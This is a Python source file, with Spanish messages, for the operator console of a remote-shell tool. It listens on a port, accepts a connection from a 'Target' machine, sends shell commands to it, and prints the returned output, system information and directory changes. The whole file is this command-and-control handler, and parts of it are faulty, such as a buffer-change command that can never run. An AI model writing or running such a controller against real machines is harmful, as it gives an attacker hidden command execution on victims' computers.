from socket import socket, timeout
from sys import exit, argv
from conexions import connect
from getpass import _raw_input
from json import dumps
from ast import literal_eval
from base64 import b32decode, b32encode

class _Server:
    
    def __init__(self, RHOST, RPORT, ENCRIPT):

        self._RHOST = RHOST
        self._RPORT = RPORT
        self._Buffer = 1024 * 4
        self._CONNECT = socket()
        self._CONNECT_CLASS = connect(self._RHOST, self._RPORT)
        self._ENCRIPT = ENCRIPT
        self._Comando = ""
        self._Cursor = ""

    def _Server(self):

        try:

            self._CONNECT.bind((self._RHOST, self._RPORT))
            self._CONNECT.listen(1)
            self.Target, self.Ip = self._CONNECT.accept()

            self._CONNECT_CLASS._CONNECT = self.Target
            del([self.Target, self.Ip])
            
            self._Buffer = self._CONNECT_CLASS._Recv(4080, self._ENCRIPT)
            data = self._CONNECT_CLASS._Recv(self._Buffer, self._ENCRIPT)
            try:
                if data == 1:
                    print("[!] error de descodificacion por parte del server")
                else:
                    data = literal_eval(data)
                    for i in range(1, 999):
                        print(data[str(i)])
            except KeyError:
                self._Cursor = data[str(i-1)]
                print('\033[1A'+" "*90)
            print("buffer server: {}".format(self._Buffer))

            while True:
                
                self._Comando = _raw_input(self._Cursor)
                if self._Comando == " " or self._Comando == "":
                    continue
                self._CONNECT_CLASS._Send(self._Comando, self._ENCRIPT)
                try:
                    self._Buffer = self._CONNECT_CLASS._Recv(4080, self._ENCRIPT)
                    self._Buffer = int(self._Buffer)
                except ValueError:
                    pass
                    
                    self._Buffer = 1024*4

                
                if self._Comando[:4] == "exit":
                    self._CONNECT_CLASS._Close(False)
                    self._CONNECT.close()
                    exit(0)

                elif self._Comando[:10] == "systeminfo":
                    data = self._CONNECT_CLASS._Recv(self._Buffer, self._ENCRIPT)
                    try:
                        data = literal_eval(data)
                        for i in range(1, 999):
                            print(data[str(i)])
                    except KeyError:
                        self._Cursor = data[str(i-1)]
                        print('\033[1A'+" "*90)
                    print("buffer server: {}".format(self._Buffer))

                elif self._Comando[:2] == "cd":

                    self._Comando = self._CONNECT_CLASS._Recv(self._Buffer, self._ENCRIPT)
                    print("data-raw: {}".format(self._Comando))

                    data = literal_eval(self._Comando)
                    self._Cursor = data["cursor"]
                    if data["estado"] == 3:
                        print("Ocurrio un error 3 de tipo IsADirectoryError, esto se debe a que la ruta a desplazarse no es un directorio")
                    
                    print("ruta actual: "+data["ruta actual"])
                    print("ruta anterior: "+data["ruta antigua"])

                elif self._Comando[:12] == "BufferServer":
                    print("[*] Buffer actual del server: {}".format(self._Buffer))
                elif self._Comando[:18] == "BufferServerChange":
                    print("[*] Buffer actual del server: {}".format(self._Buffer))
                    a = int(_raw_input("size del buffer para el server: "))
                    if  a  == 0:
                        print("[!] El bufer no se cambio, buffer actual: {}".format(self._Buffer))
                        del a
                    else:
                        self._Buffer = a
                        del a
                        print("[*] El buffer se cambio de forma correcta, buffer actual del server: {}".format(self._Buffer))
        
                else:
                    try:
                        self._CONNECT_CLASS._CONNECT.settimeout(1)
                        self._Comando = self._CONNECT_CLASS._Recv(self._Buffer, self._ENCRIPT)
                        
                        try:
                            print("data-raw: " + self._Comando)
                            data = literal_eval(self._Comando)
                            try:
                                try:
                                    print(data["comando-data"])
                                except (KeyError):
                                    print("[!] No se pudo identificar los datos")
                                self._Cursor = data["cursor"]
                            except TypeError:
                                self._Buffer = data                        
                            
                        except SyntaxError:
                            #print("Error sintaxis")
                            #self._CONNECT_CLASS._Send("exit", self._ENCRIPT)
                            #self._CONNECT.close()
                            #self._CONNECT_CLASS._Close(False)
                            #exit(0)
                            print(self._Comando)
                    except KeyboardInterrupt:
                        pass
        finally:
            pass

_Server = _Server("127.0.0.1", int(argv[1]), False)
_Server._Server()